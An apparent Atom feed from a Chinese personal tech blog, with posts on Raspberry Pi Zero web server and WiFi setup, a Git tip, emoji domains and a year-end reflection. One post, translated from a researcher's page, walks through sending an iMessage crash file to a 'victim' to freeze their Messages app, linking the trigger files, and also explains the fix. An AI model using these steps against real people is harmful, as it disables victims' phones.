<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Ivan&#39;s Blog</title>
  <subtitle>Web前端 &amp; 极客 &amp; 渗透</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://blog.yfgeek.com/"/>
  <updated>2017-01-12T14:53:50.000Z</updated>
  <id>http://blog.yfgeek.com/</id>
  
  <author>
    <name>Ivan</name>
    <email>yifanb@gmail.com</email>
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>用Raspberry Pi Zero打造“即插即用”的Web服务器</title>
    <link href="http://blog.yfgeek.com/2017/01/12/network-zero-web/"/>
    <id>http://blog.yfgeek.com/2017/01/12/network-zero-web/</id>
    <published>2017-01-12T02:04:44.000Z</published>
    <updated>2017-01-12T14:53:50.000Z</updated>
    
    <content type="html"><![CDATA[<p>虽然Raspberry Pi Zero只有4.5英镑，非常便宜，但确实具有局限性，由于缺少网口、WiFi，功能比较单一，可曾设想，用Raspberry Pi Zero打造一个完美的“即插即用”的Web服务器？</p>
<p><img src="/content/images/zeroweb/0.jpg" alt=""></p>
<p>何为即插即用？</p>
<p>类似于优盘一样，插上电脑，等待几秒，直接识别为网卡，直接输入树莓派的网址，连接就是自己的网站。</p>
<p>有什么用？</p>
<p>实现本地web本地化，随着前端、后端技术的发展，web应用越来越多，但是web应用受制于网络的限制，一旦没有网络，就没有用武之地。</p>
<p>那么为什么不把web本地化呢？以后拿着“即插即用”的服务器，到任何电脑上，都能随时办公。</p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>我们可以把树莓派虚拟为网卡，然后在内网连接它。</p>
<p>1.下载完整版 Raspbian Jessie 或 Raspbian Jessie Lite 系统，并且刷到你的SD Card里，Windows用Win32 Disk Imager， Mac/Linux 用命令，如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">diskutil list</div><div class="line">diskutil unmountDisk /dev/SD卡的标号 <span class="comment">#如disk2</span></div><div class="line"><span class="built_in">cd</span> /Users/ivan/Downloads/2016-11-25-raspbian-jessie <span class="comment">#进入目录</span></div><div class="line">sudo dd bs=1m <span class="keyword">if</span>=2016-11-25-raspbian-jessie.img of=/dev/rdisk2</div></pre></td></tr></table></figure>
<p>2.刷好系统后编辑<code>config.txt</code>文件，在最后一行下，另起一行添加：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dtoverlay=dwc2</div></pre></td></tr></table></figure></p>
<p>保存文件</p>
<p>3.最后，打开<code>cmdline.txt</code>文件。<br>找到单词<code>rootwait</code>，在其之后添加：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">modules-load=dwc2,g_ether</div></pre></td></tr></table></figure>
<p>4.添加一个文件名为<code>ssh</code>到根目录下，内容为空</p>
<p>5.把SD Card放到树莓派Zero，用安卓数据线与电脑连接，USB口接OTG口，等待60-90s，电脑会发现网卡并且自动配置ip地址。</p>
<p><img src="/content/images/raspizero/1.png" alt=""></p>
<p>6.Ping 一下raspberrypi.local看是否能通</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">PING raspberrypi.local (169.254.70.245): 56 data bytes</div><div class="line">64 bytes from 169.254.70.245: icmp_seq=0 ttl=64 time=0.570 ms</div><div class="line">64 bytes from 169.254.70.245: icmp_seq=1 ttl=64 time=0.338 ms</div><div class="line">64 bytes from 169.254.70.245: icmp_seq=2 ttl=64 time=0.316 ms</div><div class="line">64 bytes from 169.254.70.245: icmp_seq=3 ttl=64 time=0.344 ms</div></pre></td></tr></table></figure>
<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>1.ssh连接raspberrypi.local，默认密码为raspberry<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pi@raspberrypi.local</div></pre></td></tr></table></figure></p>
<p>2.通过直接运行<code>raspi-config</code>命令</p>
<p>你需要做</p>
<ul>
<li>容量扩展</li>
<li>更改系统时区</li>
<li>更改系统密码</li>
</ul>
<p>3.同时你需要通过执行<code>sudo passwd root</code>更改root密码</p>
<p>4.在本机设置代理</p>
<p>首先，设置本机名为Mac，在本机搭建一个squid，为了使树莓派安装web server，以后日常使用不需要。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">brew update</div><div class="line">brew install squid</div></pre></td></tr></table></figure>
<p>5.然后下载<a href="http://squidman.net/squidman/" target="_blank" rel="external">SquidMan</a>，安装。<br>在本机开启端口为8080的HTTP代理服务，并把本机名称更为Mac。</p>
<p>6.进入树莓派的shell，输入：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> /etc/apt/apt.conf.d</div><div class="line">sudo vi 50raspi</div></pre></td></tr></table></figure></p>
<p>最后一行加入一句话：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Acquire::http::Proxy &quot;http://Mac.local:8080&quot;;</div></pre></td></tr></table></figure></p>
<p>保存</p>
<p>7.继续输入<code>apt-get update</code>查看是否有网络。</p>
<p>8.安装<code>lighthttpd+mysql+php</code></p>
<p>输入：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install lighttpd mysql-server php5-cgi php5-mysql</div></pre></td></tr></table></figure>
<p>等待安装完毕后，修改<code>php.ini</code>设置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo nano /etc/php5/cgi/php.ini</div></pre></td></tr></table></figure>
<p>去掉这一条注释的<code>;</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">;cgi.fix_pathinfo = 1</div></pre></td></tr></table></figure></p>
<p>随后修改<code>lighttpd.conf</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo nano /etc/lighttpd/lighttpd.conf</div></pre></td></tr></table></figure></p>
<p>在<code>server.modules</code>中增加<code>fastcgi</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">server.modules = (</div><div class="line">&quot;mod_access&quot;,</div><div class="line">&quot;mod_alias&quot;,</div><div class="line">&quot;mod_compress&quot;,</div><div class="line"># &quot;mod_redirect&quot;,</div><div class="line">&quot;mod_fastcgi&quot;,</div><div class="line"># &quot;mod_rewrite&quot;,</div><div class="line">)</div></pre></td></tr></table></figure></p>
<p>最后添加<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">fastcgi.server = ( &quot;.php&quot; =&gt; ((</div><div class="line">    &quot;bin-path&quot; =&gt; &quot;/usr/bin/php5-cgi&quot;,</div><div class="line">    &quot;socket&quot; =&gt; &quot;/tmp/php.socket&quot;</div><div class="line">)))</div></pre></td></tr></table></figure></p>
<p>重启lighttpd服务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo /etc/init.d/lighttpd restart</div></pre></td></tr></table></figure></p>
<p>通过scp协议，上传一个<code>index.php</code>文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">phpinfo();</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>删除默认的<code>index.htm</code>文件，打开网站<code>http://自己树莓派名字.local</code><br>查看是否成功。</p>
<p><img src="/content/images/zeroweb/1.png" alt=""></p>
<p>不错，接下来的事情，就是把自己的源代码传到树莓派上，不过多叙述。</p>
<h1 id="多说一句"><a href="#多说一句" class="headerlink" title="多说一句"></a>多说一句</h1><p>从此以后，你只需要带上你的树莓派Zero就可以随时随地的打开自己的私有web服务。但是，树莓派Zero的性能，确实不行，建议跑一跑小型的程序，不要跑太大的程序。</p>
<p><img src="/content/images/zeroweb/2.png" alt=""></p>
<p>至于应用嘛，其实做什么都可以的。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;虽然Raspberry Pi Zero只有4.5英镑，非常便宜，但确实具有局限性，由于缺少网口、WiFi，功能比较单一，可曾设想，用Raspberry Pi Zero打造一个完美的“即插即用”的Web服务器？&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/content/images
    
    </summary>
    
      <category term="Rasberry" scheme="http://blog.yfgeek.com/categories/Rasberry/"/>
    
    
      <category term="Raspberry" scheme="http://blog.yfgeek.com/tags/Raspberry/"/>
    
  </entry>
  
  <entry>
    <title>Git 文件、文件夹区分大小写</title>
    <link href="http://blog.yfgeek.com/2017/01/07/gitcase/"/>
    <id>http://blog.yfgeek.com/2017/01/07/gitcase/</id>
    <published>2017-01-07T02:25:32.000Z</published>
    <updated>2017-01-07T02:30:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>其实非常简单，只是提醒一个小常识，Git默认是不区分文件，文件夹大小写的。</p>
<p>这会给很多人带来很多困扰，比如文件改了名，在严格区分大小写的系统下，实际上是两个不同名字的文件，但是Git不区分大小写机制导致无法正常的commit。</p>
<p>开启Git区分大小写</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git config core.ignorecase false</div></pre></td></tr></table></figure>
<p>最近爱上了给别人找bug，Pull Request，❤️Github。</p>
<p>任何细节，都很重要。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;其实非常简单，只是提醒一个小常识，Git默认是不区分文件，文件夹大小写的。&lt;/p&gt;
&lt;p&gt;这会给很多人带来很多困扰，比如文件改了名，在严格区分大小写的系统下，实际上是两个不同名字的文件，但是Git不区分大小写机制导致无法正常的commit。&lt;/p&gt;
&lt;p&gt;开启Git区分大小
    
    </summary>
    
      <category term="Github" scheme="http://blog.yfgeek.com/categories/Github/"/>
    
    
      <category term="Github" scheme="http://blog.yfgeek.com/tags/Github/"/>
    
  </entry>
  
  <entry>
    <title>iOS 10 iMessage字符崩溃Bug又来了</title>
    <link href="http://blog.yfgeek.com/2017/01/02/iOS-10-iMessage%E5%AD%97%E7%AC%A6%E5%B4%A9%E6%BA%83Bug%E5%8F%88%E6%9D%A5%E4%BA%86/"/>
    <id>http://blog.yfgeek.com/2017/01/02/iOS-10-iMessage字符崩溃Bug又来了/</id>
    <published>2017-01-02T03:49:54.000Z</published>
    <updated>2017-01-02T13:11:39.000Z</updated>
    
    <content type="html"><![CDATA[<p>这是一篇本人发表到Freebuf的文章。</p>
<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>近日，黑客@vincedes3发现了一个从iOS 8 到 iOS 10.2.1 b2通用的iMessage字符崩溃Bug，该Bug同样利用了和当年iOS 8的iMessage短信Bug的类似手法，将一段恶意代码发送给受害者，受害者在接收短信后，浏览短信即可中招，此后短信应用陷入死机状态，除非打开修复网页程序，否则再也无法打开短信应用。</p>
<p><img src="http://image.3001.net/images/20170102/14833282151664.png!small" alt="1.png"></p>
<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>1. 下载利用文件 <a href="http://vincedes3.com/vincedes3.vcf" target="_blank" rel="external">点击这里下载</a></p>
<p>2. 把它传到 iCloud Drive, 百度云, 或者任何你能够在iPhone上下载到的地方</p>
<p>3. 打开这个文件，点击分享，再点击 短信图标</p>
<p>4. 通过iMessage把这个文件传给你的受害者好友</p>
<p>5. 等待受害者点开短信，他会中招的</p>
<p>6. 可以通过这个链接来修复 <a href="http://vincedes3.com/save.html" target="_blank" rel="external">点我修复</a></p>
<embed src="http://player.youku.com/player.php/sid/XMTg5NTI3ODE2NA==/v.swf" allowfullscreen="true" quality="high" width="480" height="400" align="middle" allowscriptaccess="always" type="application/x-shockwave-flash">

<p><a href="http://v.youku.com/v_show/id_XMTg5NTI3ODE2NA==.html#paction" target="_blank" rel="external">demo视频</a></p>
<h1 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h1><p>在受害者打开短信的时候，触发了大量能够引起短信程序崩溃的字符，当用户浏览该短信的时候，cpu进行了大量的计算直到短信app点不动。当用户关掉短信程序后，再次打开短信程序，系统试图加载上一次内容，依然会触发该bug。</p>
<p><img src="http://image.3001.net/images/20170102/14833289116916.jpg!small" alt="2.jpg"></p>
<p>TXT版本的触发代码: <a href="http://www.example.com" target="_blank" rel="external">http://vincedes3.com/crashtext.txt</a></p>
<p>HTML版本的触发代码: <a href="http://vincedes3.com/crashtext.html" target="_blank" rel="external">http://vincedes3.com/crashtext.html</a></p>
<h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><p>1. 把这个链接发给受害者手机 <a href="http://vincedes3.com/save.html" target="_blank" rel="external">点我修复</a></p>
<p>2. 该链接会触发短信的快捷链接，点击打开</p>
<p>3. 进入发送短信页面</p>
<p>4. 点击取消</p>
<p>5. 删掉发送者的短信即可解决bug，请勿再次尝试点入</p>
<p>本文翻译自：<a href="https://vincedes3.com/crash-message-app-iphone/" target="_blank" rel="external">https://vincedes3.com/crash-message-app-iphone/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是一篇本人发表到Freebuf的文章。&lt;/p&gt;
&lt;h1 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h1&gt;&lt;p&gt;近日，黑客@vincedes3发现了一个从iOS 8 到 iOS 10.2.1 b2
    
    </summary>
    
      <category term="Hack" scheme="http://blog.yfgeek.com/categories/Hack/"/>
    
    
      <category term="Hack" scheme="http://blog.yfgeek.com/tags/Hack/"/>
    
  </entry>
  
  <entry>
    <title>2016，2017</title>
    <link href="http://blog.yfgeek.com/2016/12/31/2017/"/>
    <id>http://blog.yfgeek.com/2016/12/31/2017/</id>
    <published>2016-12-31T14:51:23.000Z</published>
    <updated>2016-12-31T21:30:09.000Z</updated>
    
    <content type="html"><![CDATA[<p>似乎每年写年终总结已经成为习惯，2007年开始写博客，2009年开始，每年都象征性的写一个年终报告，或许是元旦或许是新年。</p>
<p>每年这个时候，都会自觉地打开cnbeta.com看每一年的<a href="http://www.cnbeta.com/articles/572451.htm" target="_blank" rel="external">新年祝福</a>。今年，也不例外，这么一看，已经9年过去了。</p>
<h1 id="2016"><a href="#2016" class="headerlink" title="2016"></a>2016</h1><p>在2016年，这一年励志在Github上取得更大的成就，知乎上娱乐为主。</p>
<p>截止2016年12月31日，知乎累计收获了1388个赞，获得 252 次感谢，209 次收藏。</p>
<p>Github获得Star总数88个，607次代码贡献次数，702个粉丝。</p>
<p>同时，2016年是忙碌的一年，是纠结的一年，是辛苦的一年。在这一年里，顺利的通过了雅思考试，在这一年里顺利的本科毕业，在这一年里励志转行计算机。</p>
<p>在这一年里，好朋友各奔东西，都有了自己的发展方向与人生目标，而我却还在迷茫之中。</p>
<h1 id="2017"><a href="#2017" class="headerlink" title="2017"></a>2017</h1><p>2017年是关键的一年，决定着人生发展方向，人生充满机遇，未来的事情，谁说的好呢？</p>
<p>我不去想，</p>
<p>是否能够成功 ，</p>
<p>既然选择了远方 ，</p>
<p>便只顾风雨兼程。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;似乎每年写年终总结已经成为习惯，2007年开始写博客，2009年开始，每年都象征性的写一个年终报告，或许是元旦或许是新年。&lt;/p&gt;
&lt;p&gt;每年这个时候，都会自觉地打开cnbeta.com看每一年的&lt;a href=&quot;http://www.cnbeta.com/articles
    
    </summary>
    
      <category term="心情" scheme="http://blog.yfgeek.com/categories/%E5%BF%83%E6%83%85/"/>
    
    
      <category term="心情" scheme="http://blog.yfgeek.com/tags/%E5%BF%83%E6%83%85/"/>
    
  </entry>
  
  <entry>
    <title>Emoji 表情域名 引领未来</title>
    <link href="http://blog.yfgeek.com/2016/12/27/emoji/"/>
    <id>http://blog.yfgeek.com/2016/12/27/emoji/</id>
    <published>2016-12-27T03:37:27.000Z</published>
    <updated>2016-12-27T03:59:29.000Z</updated>
    
    <content type="html"><![CDATA[<p>国外媒体报道，《牛津词典》(Oxford Dictionaries)今日公布了2015年年度词汇。今年的年度“词汇”很难发音，因为它并不是由字母组成，而是一个黄色的卡通笑脸，带着两滴眼泪。😂</p>
<p><img src="/content/images/emoji/1.jpg" alt=""></p>
<p>Emoji 等 Unicode 字符，浏览器Punycode的方式将 Unicode字符用ASCII进行编码。</p>
<p>我也顺势跟风，注册了一个坑爹的TK域名。</p>
<p><a href="http://💌.tk" target="_blank" rel="external">💌.tk</a></p>
<p><img src="/content/images/emoji/emoji.jpg" alt=""></p>
<h1 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h1><p>在chrome浏览器上直接输入[想要注册的表情].com</p>
<p>按下回车键，chrome浏览器会自动帮你转换为ASCII编码方式的格式。</p>
<p>💌.tk</p>
<p>转换为：</p>
<p><a href="http://xn--rr8h.tk/" target="_blank" rel="external">http://xn--rr8h.tk/</a></p>
<h1 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h1><p>拿着自己的域名转换后的字符，比如xn–rr8h，去Godaddy或者别的域名网站直接搜就好啦。</p>
<p>注意：</p>
<p>.com域名目前无法注册任何包含emoji表情字符的域名，尚未开发，一旦开放，又是一笔巨大的商机。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="http://🌶️🐔.ws" target="_blank" rel="external">🐔.ws</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;国外媒体报道，《牛津词典》(Oxford Dictionaries)今日公布了2015年年度词汇。今年的年度“词汇”很难发音，因为它并不是由字母组成，而是一个黄色的卡通笑脸，带着两滴眼泪。😂&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/content/images/emoji/1
    
    </summary>
    
      <category term="Web" scheme="http://blog.yfgeek.com/categories/Web/"/>
    
    
      <category term="Web" scheme="http://blog.yfgeek.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Raspberry Pi Zero联网奇妙记</title>
    <link href="http://blog.yfgeek.com/2016/12/21/network-zero/"/>
    <id>http://blog.yfgeek.com/2016/12/21/network-zero/</id>
    <published>2016-12-21T23:01:26.000Z</published>
    <updated>2016-12-22T15:30:15.000Z</updated>
    
    <content type="html"><![CDATA[<p>说句实话，Zero真的不适合把玩，想让他连上网，太难了。</p>
<h1 id="痛点"><a href="#痛点" class="headerlink" title="痛点"></a>痛点</h1><ul>
<li>住公寓，有WiFi/Lan登录认证系统</li>
<li>公寓的网络动态分配范围很大，很难快速找到树莓派的IP</li>
<li>公寓的网络防止扫描端口，有惩罚策略</li>
<li>没有显示器 无法查看树莓派Zero的状态</li>
<li>树莓派Zero只有一个OTG USB接口</li>
<li>树莓派Zero没有内置以太网Lan</li>
<li>树莓派Zero没有无线网卡WiFi</li>
<li>树莓派Zero没有蓝牙 更没有蓝牙局域网</li>
<li>树莓派Zero除了核心部分 一无所有</li>
</ul>
<h1 id="已有装备"><a href="#已有装备" class="headerlink" title="已有装备"></a>已有装备</h1><ul>
<li>树莓派Zero</li>
<li>USB HUB 分线器</li>
<li>USB 以太网网卡</li>
<li>USB WIFI (芯片 8188EU)</li>
<li>路由器</li>
<li>网线一根</li>
<li>MacBook Pro一台</li>
</ul>
<h1 id="已有环境"><a href="#已有环境" class="headerlink" title="已有环境"></a>已有环境</h1><ul>
<li>Raspbian系统</li>
<li>vncserver</li>
</ul>
<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><h2 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h2><p><img src="/content/images/zeronet/0.png" alt=""></p>
<p>其中 USB HUB USB网卡 临时路由器 PC 是临时之用 配置一旦完成 抛弃这些设备直接插上WiFi自动联网。</p>
<p><img src="/content/images/zeronet/1.jpg" alt=""></p>
<h2 id="去掉之前的USB网卡模式"><a href="#去掉之前的USB网卡模式" class="headerlink" title="去掉之前的USB网卡模式"></a>去掉之前的USB网卡模式</h2><p>把sd卡取出，插入电脑</p>
<p>在<code>config.txt</code>下删除<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dtoverlay=dwc2</div></pre></td></tr></table></figure></p>
<p>在<code>cmdline.txt</code>下删除<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">modules-load=dwc2,g_ether</div></pre></td></tr></table></figure></p>
<h2 id="安装WiFi驱动"><a href="#安装WiFi驱动" class="headerlink" title="安装WiFi驱动"></a>安装WiFi驱动</h2><p>之前遇到过很多坑，比如别的内核的WiFi驱动。</p>
<p>首先手动下载</p>
<p><a href="https://dl.dropboxusercontent.com/u/80256631/install-wifi.tar.gz" target="_blank" rel="external">https://dl.dropboxusercontent.com/u/80256631/install-wifi.tar.gz</a></p>
<p>检查无线适配器版本，同时传到树莓派上</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">pi@zero:~ $ sudo ./install-wifi</div><div class="line"></div><div class="line">Your current kernel revision = 4.4.34+</div><div class="line">Your current kernel build    = <span class="comment">#930</span></div><div class="line"></div><div class="line">Checking <span class="keyword">for</span> a wifi module to determine the driver to install.</div><div class="line"></div><div class="line">Your wifi module is Bus 001 Device 003: ID 0bda:8179 Realtek Semiconductor Corp.</div><div class="line"></div><div class="line">And it uses the 8188eu driver.</div><div class="line"></div><div class="line">Checking <span class="keyword">for</span> a new 8188eu wifi driver module <span class="keyword">for</span> your current kernel.</div><div class="line">The script cannot access Dropbox to check a driver is available.</div></pre></td></tr></table></figure>
<p>手动下载<br><a href="https://dl.dropboxusercontent.com/u/80256631/8188eu-4.4.34-930.tar.gz" target="_blank" rel="external">https://dl.dropboxusercontent.com/u/80256631/8188eu-4.4.34-930.tar.gz</a></p>
<p>切换WiFi到树莓派网络<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">scp 8188eu-4.4.34-930.tar.gz pi@zero.local:~</div></pre></td></tr></table></figure></p>
<p>在树莓派下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">tar xzf  8188eu-4.4.34-930.tar.gz</div><div class="line">sudo ./install.sh</div><div class="line">reboot</div></pre></td></tr></table></figure></p>
<p>然后检查一下 <code>lsusb</code>(这个其实不靠谱) </p>
<p>然后再检查一下 <code>ifconfig</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">wlan0     Link encap:Ethernet  HWaddr 0c:82:68:12:93:8f</div><div class="line">          inet6 addr: fe80::4336:2657:c812:f11b/64 Scope:Link</div><div class="line">          UP BROADCAST MULTICAST  MTU:1500  Metric:1</div><div class="line">          RX packets:0 errors:0 dropped:6 overruns:0 frame:0</div><div class="line">          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0</div><div class="line">          collisions:0 txqueuelen:1000</div><div class="line">          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)</div></pre></td></tr></table></figure>
<p>果然正确安装了。</p>
<h2 id="配置WiFi"><a href="#配置WiFi" class="headerlink" title="配置WiFi"></a>配置WiFi</h2><p>但是<code>wlan0     Link encap:Ethernet</code>被识别为了以太网，接下来我们继续解决坑。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo iwlist wlan0 scan</div></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">Cell 03 - Address: F0:B0:52:3B:7B:68</div><div class="line">                  ESSID:<span class="string">"ASK4 Wireless"</span></div><div class="line">                  Protocol:IEEE 802.11gn</div><div class="line">                  Mode:Master</div><div class="line">                  Frequency:2.417 GHz (Channel 2)</div><div class="line">                  Encryption key:off</div><div class="line">                  Bit Rates:144 Mb/s</div><div class="line">                  Quality=18/100  Signal level=70/100</div><div class="line">                  Extra:fm=0001</div></pre></td></tr></table></figure>
<p>随后对<code>wpa_supplicant.conf</code>文件进行编辑，使之加入到自己的网络里。</p>
<p>请注意，<code>key_mgmt=NONE</code>表示没有WiFi密码(这是个查了很久猜得到的宝贵线索)，如果有密码请把这个更改为<code>psk = &quot;密码&quot;</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo vi /etc/wpa_supplicant/wpa_supplicant.conf</div></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">country=GB</div><div class="line">ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev</div><div class="line">update_config=1</div><div class="line">network=&#123;</div><div class="line">        ssid=<span class="string">"ASK4 Wireless"</span></div><div class="line">        key_mgmt=NONE</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>编辑<code>/etc/network/interfaces</code>文件，使wlan0为动态分配获取IP。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo vi /etc/network/interfaces</div></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">auto lo</div><div class="line">iface lo inet loopback</div><div class="line"></div><div class="line">iface eth0 inet dhcp</div><div class="line"></div><div class="line">auto wlan0</div><div class="line">allow-hotplug wlan0</div><div class="line">iface wlan0 inet dhcp</div><div class="line">wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf</div><div class="line"></div><div class="line"></div><div class="line">allow-hotplug wlan1</div><div class="line">iface wlan1 inet manual</div><div class="line">    wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf</div></pre></td></tr></table></figure>
<p>随后重启我们wlan0</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo ifdown wlan0</div><div class="line">sudo ifup wlan0</div></pre></td></tr></table></figure>
<p>如果能搜索到WiFi会自动进行DHCP获取ip地址阶段</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">Listening on LPF/wlan0/0c:82:68:12:93:8f</div><div class="line">Sending on   LPF/wlan0/0c:82:68:12:93:8f</div><div class="line">Sending on   Socket/fallback</div><div class="line">DHCPDISCOVER on wlan0 to 255.255.255.255 port 67 interval 8</div><div class="line">DHCPDISCOVER on wlan0 to 255.255.255.255 port 67 interval 12</div><div class="line">DHCPREQUEST on wlan0 to 255.255.255.255 port 67</div><div class="line">DHCPOFFER from 10.80.192.1</div><div class="line">DHCPACK from 10.80.192.1</div><div class="line">bound to 10.80.200.83 -- renewal <span class="keyword">in</span> 440 seconds.</div></pre></td></tr></table></figure>
<p>随后，用<code>ifconfig</code>命令查看一下获取的IP地址</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">wlan0     Link encap:Ethernet  HWaddr 0c:82:68:12:93:8f</div><div class="line">          inet addr:10.80.200.83  Bcast:10.80.207.255  Mask:255.255.240.0</div><div class="line">          UP BROADCAST MULTICAST  MTU:1500  Metric:1</div><div class="line">          RX packets:0 errors:0 dropped:17 overruns:0 frame:0</div><div class="line">          TX packets:0 errors:0 dropped:1 overruns:0 carrier:0</div><div class="line">          collisions:0 txqueuelen:1000</div><div class="line">          RX bytes:4681 (4.5 KiB)  TX bytes:18372 (17.9 KiB)</div></pre></td></tr></table></figure>
<p><img src="/content/images/zeronet/3.png" alt=""></p>
